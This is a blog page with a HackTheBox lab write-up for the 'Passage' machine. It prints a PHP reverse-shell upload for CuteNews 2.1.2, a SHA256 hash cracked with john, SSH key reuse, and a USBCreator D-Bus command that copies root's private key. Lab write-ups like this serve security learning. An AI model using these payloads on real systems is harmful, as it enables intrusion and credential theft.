<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HackTheBox - Passage Writeup | mdn1nj4's Blog</title><meta name="author" content="mdn1nj4"><meta name="copyright" content="mdn1nj4"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Passage is the medium level hackthebox machine which is running in the linux."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "HackTheBox - Passage Writeup",
  "url": "https://mdn1nj4.github.io/htb/hackthebox-passage-writeup/",
  "image": "https://avatars.githubusercontent.com/u/24633923?v=4",
  "datePublished": "2021-09-12T05:38:00.000Z",
  "dateModified": "2025-05-08T07:31:28.260Z",
  "author": [
    {
      "@type": "Person",
      "name": "mdn1nj4",
      "url": "https://mdn1nj4.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/24633923?v=4"><link rel="canonical" href="https://mdn1nj4.github.io/htb/hackthebox-passage-writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-X9TKY34D40"></script><script>window.dataLayer = window.dataLayer || []
function gtag(){dataLayer.push(arguments)}
gtag('js', new Date())
gtag('config', 'G-X9TKY34D40')
btf.addGlobalFn('pjaxComplete', () => {
  gtag('config', 'G-X9TKY34D40', {'page_path': window.location.pathname})
}, 'google_analytics')
</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HackTheBox - Passage Writeup',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="mdn1nj4's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://avatars.githubusercontent.com/u/24633923?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">mdn1nj4's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HackTheBox - Passage Writeup</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">HackTheBox - Passage Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-09-12T05:38:00.000Z" title="Created 2021-09-12 11:08:00">2021-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-08T07:31:28.260Z" title="Updated 2025-05-08 13:01:28">2025-05-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HackTheBox/">HackTheBox</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>11mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><span id="more"></span>

<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a><strong>Introduction</strong></h1><p>Passage is medium level machine, Enumuration is the key for this box. First we have to exploit the cutenews Web application to Get the initial reverse shell after that i found the bunch of php files which contains the user information with base64 format then we get the hash for the user paul and decrypt the hash and i login to to user paul. The user paul and nadav share the  ssh keys so i copied the ssh key and Get access to the user nadav after that i found the nadav user in sudo group and .vim info reveal the usefull imformation for getting root this machine  In order to root this machine i used the USBCreator D-Bus Privilege Escalation.</p>
<blockquote>
<p>Skills Required : Enumuration, Basic linux command<br>Skills Learned : web Exploitaion, USBCreator D-Bus Privilege Escalation</p>
</blockquote>
<h1 id="Enumuration"><a href="#Enumuration" class="headerlink" title="Enumuration"></a><strong>Enumuration</strong></h1><h4 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a><strong>Nmap scan</strong></h4><p>the nmap scan show there is 2 port open</p>
<ol>
<li><p>22 ssh</p>
</li>
<li><p>80 http</p>
<p> #nmap -sV -sC -oN scan-tcp.nmap 10.10.10.206<br> Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-03-18 17:32 GMT<br> Nmap scan report for 10.10.10.206<br> Host is up (0.040s latency).<br> Not shown: 998 closed ports<br> PORT   STATE SERVICE VERSION<br> 22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br> | ssh-hostkey:<br> |   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)<br> |   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)<br> |_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)<br> 80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br> |_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)<br> |_http-title: Passage News<br> Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
<p> Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br> Nmap done: 1 IP address (1 host up) scanned in 22.31 seconds</p>
</li>
</ol>
<p>so the machine run the apache web server. I opened the web page in my browser</p>
<h1 id="CuteNews"><a href="#CuteNews" class="headerlink" title="CuteNews"></a><strong>CuteNews</strong></h1><p>web page show the host name and give me the 2 Email address<br>admin   : <a href="mailto:&#x6e;&#x61;&#x64;&#x61;&#118;&#64;&#x70;&#x61;&#x73;&#x73;&#97;&#x67;&#x65;&#x2e;&#x68;&#x74;&#x62;">&#x6e;&#x61;&#x64;&#x61;&#118;&#64;&#x70;&#x61;&#x73;&#x73;&#97;&#x67;&#x65;&#x2e;&#x68;&#x74;&#x62;</a><br>paul Colas  : <a href="mailto:&#x70;&#97;&#x75;&#108;&#64;&#112;&#97;&#x73;&#115;&#97;&#103;&#101;&#46;&#x68;&#x74;&#x62;">&#x70;&#97;&#x75;&#108;&#64;&#112;&#97;&#x73;&#115;&#97;&#103;&#101;&#46;&#x68;&#x74;&#x62;</a></p>
<p>I add the passage.htb on my &#x2F;etc&#x2F;hosts file.<br>and the page reveals website is powered by Cutenews after searching on the internet i found the cutenews is the news management based on flat files as a storage.</p>
<p>so after that i searched on the internet for any Exploit available for cutenews ad i looked the page source code i found some interesting information</p>
<pre><code># Source Page Code 
&lt;link href=&quot;CuteNews/libs/css/cosmo.min.css&quot; rel=&quot;stylesheet&quot;&gt;
&lt;link href=&quot;CuteNews/libs/css/font-awesome.min.css&quot; rel=&quot;stylesheet&quot;&gt;
</code></pre>
<p>After that i go the directory Cutenews and i found the login page of the cutenews</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://10.10.10.206/CuteNews">https://10.10.10.206/CuteNews</a>  </p>
</blockquote>
<p>the login page of the Cutenews show the version of the cutenews is 2.1.2</p>
<h1 id="CuteNews-2-1-2-Remote-Code-Execution"><a href="#CuteNews-2-1-2-Remote-Code-Execution" class="headerlink" title="CuteNews 2.1.2 - Remote Code Execution"></a><strong>CuteNews 2.1.2 - Remote Code Execution</strong></h1><p>so i check for the exploit in exploitdb using the command searchsploit</p>
<blockquote>
<p>user@home:~$ searchsploit cutenews 2.1.2</p>
</blockquote>
<pre><code>#searchsploit cutenews 2.1.2
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - &#39;avatar&#39; Remote Code Execution (Metasploit)                                         | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                             | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                 | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                               | php/webapps/48800.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<blockquote>
<p>user@home:~$ searchsploit -m php&#x2F;webapps&#x2F;48800.py</p>
</blockquote>
<p>if you want to run that script its ok but i have to exploit the cutenews manually.</p>
<p>Its simple 3 step process.</p>
<ol>
<li>create a user</li>
</ol>
<blockquote>
<p>Register Form  </p>
</blockquote>
<ol>
<li>then click on the personal options</li>
<li>scroll down you see the upload avatar upload the shell.php</li>
</ol>
<blockquote>
<p>user@home:~$ vim shell.php</p>
</blockquote>
<pre><code>GIF8;
&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/YOURIP/1234 0&gt;&amp;1&#39;&quot;) ?&gt;
</code></pre>
<p>save the file and upload.<br>before open the avatar image you need to create a listener on port 1234 with nc commmand</p>
<blockquote>
<p>user@home:~$ nc -lvvnkp 1234 open the avatar image in the browser and i got that shell!</p>
</blockquote>
<pre><code>#nc -lvvnkp 1234
listening on [any] 1234 ...
connect to [10.10.14.xx] from (UNKNOWN) [10.10.10.206] 37080
bash: cannot set terminal process group (1635): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ id    
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@passage:/var/www/html/CuteNews/uploads$ 
</code></pre>
<h1 id="Getting-User-Paul"><a href="#Getting-User-Paul" class="headerlink" title="Getting User Paul"></a><strong>Getting User Paul</strong></h1><p>after some enumuration i found the directory which contains the user information and password hash in base64 format</p>
<pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ ls
ls
01.php
09.php
0a.php
16.php
21.php
2a.php
32.php
52.php
5d.php
62.php
66.php
6e.php
77.php
7a.php
81.php
8f.php
97.php
a5.php
b0.php
b1.php
c8.php
d2.php
d4.php
d5.php
d6.php
e0.php
f3.php
fc.php
lines
users.txt
</code></pre>
<blockquote>
<p>cat 09.php</p>
</blockquote>
<pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 09.php
cat 09.php
&lt;?php die(&#39;Direct call - access denied&#39;); ?&gt;
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
</code></pre>
<p>Decode the base64</p>
<blockquote>
<p>echo base64_text | base64 -d</p>
</blockquote>
<pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ echo &quot;YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319&quot; | base64 -d
&lt;Fzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319&quot; | base64 -d                     
a:1:&#123;s:5:&quot;email&quot;;a:1:&#123;s:16:&quot;paul@passage.htb&quot;;s:10:&quot;paul-coles&quot;;&#125;&#125;
</code></pre>
<p>so i decided to decode all the files i know the base64 is mostly start with “Y” so used the command</p>
<pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ grep -rh Y | base64 -d
</code></pre>
<p>i got the paul user hash let crack the hash with john</p>
<blockquote>
<p>user@home:~$ echo ‘e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd’ &gt; hash john hash –wordlist&#x3D;&#x2F;opt&#x2F;rockyou.txt –format&#x3D;Raw-SHA256</p>
</blockquote>
<pre><code>#john hash --wordlist=/opt/rockyou.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
atlanXXX         (?)
1g 0:00:00:00 DONE (2021-03-18 18:52) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
Use the &quot;--show --format=Raw-SHA256&quot; options to display all of the cracked passwords reliably
Session completed
</code></pre>
<p>change the user to paul</p>
<blockquote>
<p>python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”<br>su paul</p>
</blockquote>
<pre><code>www-data@passage:/var/www/html/CuteNews/cdata/users$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
&lt;tml/CuteNews/cdata/users$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;    
www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
su paul
Password: 

paul@passage:/var/www/html/CuteNews/cdata/users$ 
</code></pre>
<p>Found the user flag at &#x2F;home&#x2F;paul&#x2F;user.txt</p>
<pre><code>paul@passage:~$ pwd
pwd
/home/paul
paul@passage:~$ wc user.txt
wc user.txt
 1  1 33 user.txt
</code></pre>
<h1 id="Privilage-Escalation"><a href="#Privilage-Escalation" class="headerlink" title="Privilage Escalation"></a><strong>Privilage Escalation</strong></h1><p>after some enumuration i found the interesting only one entry in the auhorization_keys</p>
<pre><code>paul@passage:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</code></pre>
<h2 id="Getting-User-nadav"><a href="#Getting-User-nadav" class="headerlink" title="Getting User nadav"></a><strong>Getting User nadav</strong></h2><p>then i assume there is a possible that the user paul and nadav have shared SSH keys. so i copied the id_rsa file from the paul.</p>
<blockquote>
<p>user@home:~$ chmod 600 nadav.key user@home:~$ ssh -i nadav.key <a href="mailto:&#110;&#97;&#x64;&#x61;&#x76;&#x40;&#x70;&#97;&#115;&#x73;&#97;&#103;&#101;&#x2e;&#x68;&#x74;&#x62;">&#110;&#97;&#x64;&#x61;&#x76;&#x40;&#x70;&#97;&#115;&#x73;&#97;&#103;&#101;&#x2e;&#x68;&#x74;&#x62;</a> <strong>It worked</strong> I got the user nadav</p>
</blockquote>
<pre><code>chmod 600 nadav.key

ssh -i nadav.key nadav@passage.htb
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
nadav@passage:~$ 
</code></pre>
<h1 id="Getting-Root"><a href="#Getting-Root" class="headerlink" title="Getting Root"></a><strong>Getting Root</strong></h1><p>After some enumuration i found the some interesting information from <strong>.vim</strong> file The vim history indicates that there have been some changes in the files &#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;com.ubuntu.USBCreator.conf and &#x2F;etc&#x2F;polkit-1&#x2F;localauthority.conf.d&#x2F;51-ubuntu-admin.conf.</p>
<blockquote>
<p>nadav@passage:~$ cat  &#x2F;etc&#x2F;dbus-1&#x2F;system.d&#x2F;com.ubuntu.USBCreator.conf</p>
</blockquote>
<pre><code>nadav@passage:~$ cat  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&lt;!DOCTYPE busconfig PUBLIC
 &quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot;
 &quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;&gt;
&lt;busconfig&gt;

  &lt;!-- Only root can own the service --&gt;
  &lt;policy user=&quot;root&quot;&gt;
    &lt;allow own=&quot;com.ubuntu.USBCreator&quot;/&gt;
  &lt;/policy&gt;

  &lt;!-- Allow anyone to invoke methods (further constrained by
       PolicyKit privileges --&gt;
  &lt;policy context=&quot;default&quot;&gt;
    &lt;allow send_destination=&quot;com.ubuntu.USBCreator&quot; 
           send_interface=&quot;com.ubuntu.USBCreator&quot;/&gt;
    &lt;allow send_destination=&quot;com.ubuntu.USBCreator&quot; 
           send_interface=&quot;org.freedesktop.DBus.Introspectable&quot;/&gt;
    &lt;allow send_destination=&quot;com.ubuntu.USBCreator&quot; 
           send_interface=&quot;org.freedesktop.DBus.Properties&quot;/&gt;
  &lt;/policy&gt;

&lt;/busconfig&gt;
</code></pre>
<blockquote>
<p>nadav@passage:~$ cat &#x2F;etc&#x2F;polkit-1&#x2F;localauthority.conf.d&#x2F;51-ubuntu-admin.conf</p>
</blockquote>
<pre><code>nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
nadav@passage:~$ 
</code></pre>
<p>so i copy the file name and google it. what i understand is the user with sudo group can do the privilage escalation and the user nadav is the sudo group user so i try that command. after that i used the command to get the ssh key of the root user and copied to the &#x2F;home&#x2F;nadav&#x2F;key</p>
<blockquote>
<p>gdbus call –system –dest com.ubuntu.USBCreator –object-path &#x2F;com&#x2F;ubuntu&#x2F;USBCreator –method com.ubuntu.USBCreator.Image &#x2F;root&#x2F;.ssh&#x2F;id_rsa &#x2F;home&#x2F;nadav&#x2F;key true</p>
</blockquote>
<pre><code>nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/key true
()
</code></pre>
<p>copy the key file to my machine and saved it with name root.key then give the permission</p>
<blockquote>
<p>user@home:~$ chmod 600 root.key so let login to the root user…. BOOM</p>
</blockquote>
<blockquote>
<p>user@home:~$ ssh -i root.key <a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#112;&#x61;&#115;&#x73;&#97;&#103;&#x65;&#46;&#104;&#116;&#x62;">&#114;&#x6f;&#111;&#x74;&#x40;&#112;&#x61;&#115;&#x73;&#97;&#103;&#x65;&#46;&#104;&#116;&#x62;</a></p>
</blockquote>
<pre><code>#ssh -i root.key root@passage.htb
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~# id
uid=0(root) gid=0(root) groups=0(root)
root@passage:~# wc root.txt
 1  1 33 root.txt
root@passage:~# 
</code></pre>
<p><strong><center>#rooted</center></strong></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/htb/">htb</a></div><div class="post-share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/24633923?v=4" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/htb/hackthebox-luanne-writeup/" title="HackTheBox - Luanne walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">HackTheBox - Luanne walkthrough</div></div><div class="info-2"><div class="info-item-1">Luanne is the Easy level OpenBSD machine.Basic Enumuration and lua script does not sanitize the input from user which leads to remote code execution using the os.execute() and then after some enumuration find the id_rsa key for user r.michaels then decrypt the tar backup file and get the user r.micheals password and root part is pretty simple user r.mihaels has run the commmand doas as root user that leads to migrate from user to root privilage.</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/htb/hackthebox-dog-walkthrough/" title="HackTheBox - Dog Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-07</div><div class="info-item-2">HackTheBox - Dog Walkthrough</div></div><div class="info-2"><div class="info-item-1">Dog was an easy box from hackthebox.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-timelapse-writeup/" title="HackTheBox - Timelapse Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-31</div><div class="info-item-2">HackTheBox - Timelapse Walkthrough</div></div><div class="info-2"><div class="info-item-1">Timelapse was an easy box from hackthebox. To solve this machine we need some basic enumuration and basic knowledge about windows.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-routerspace-writeup/" title="HackTheBox - RouterSpace Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-11</div><div class="info-item-2">HackTheBox - RouterSpace Writeup</div></div><div class="info-2"><div class="info-item-1">RouterSpace was an easy box from hackthebox.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-luanne-writeup/" title="HackTheBox - Luanne walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-12</div><div class="info-item-2">HackTheBox - Luanne walkthrough</div></div><div class="info-2"><div class="info-item-1">Luanne is the Easy level OpenBSD machine.Basic Enumuration and lua script does not sanitize the input from user which leads to remote code execution using the os.execute() and then after some enumuration find the id_rsa key for user r.michaels then decrypt the tar backup file and get the user r.micheals password and root part is pretty simple user r.mihaels has run the commmand doas as root user that leads to migrate from user to root privilage.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-trick-writeup/" title="HackTheBox - Trick Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-05</div><div class="info-item-2">HackTheBox - Trick Walkthrough</div></div><div class="info-2"><div class="info-item-1">Trick was an easy box from hackthebox.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-late-writeup/" title="HackTheBox - Late Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-11</div><div class="info-item-2">HackTheBox - Late Walkthrough</div></div><div class="info-2"><div class="info-item-1">Late was an easy box from hackthebox.</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/24633923?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">mdn1nj4</div><div class="author-info-description">A collection of write-ups, walkthroughs and tips of my adventures</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://twitter.com/mdn1nj4" target="_blank" title=""><i class="fab fa-twitter"></i></a><a class="social-icon" href="https://instagram.com/" target="_blank" title=""><i class="fab fa-instagram"></i></a><a class="social-icon" href="https://linkedin.com/" target="_blank" title=""><i class="fab fa-linkedin"></i></a><a class="social-icon" href="https://github.com/mdn1nj4" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumuration"><span class="toc-number">2.</span> <span class="toc-text">Enumuration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap-scan"><span class="toc-number">2.0.0.1.</span> <span 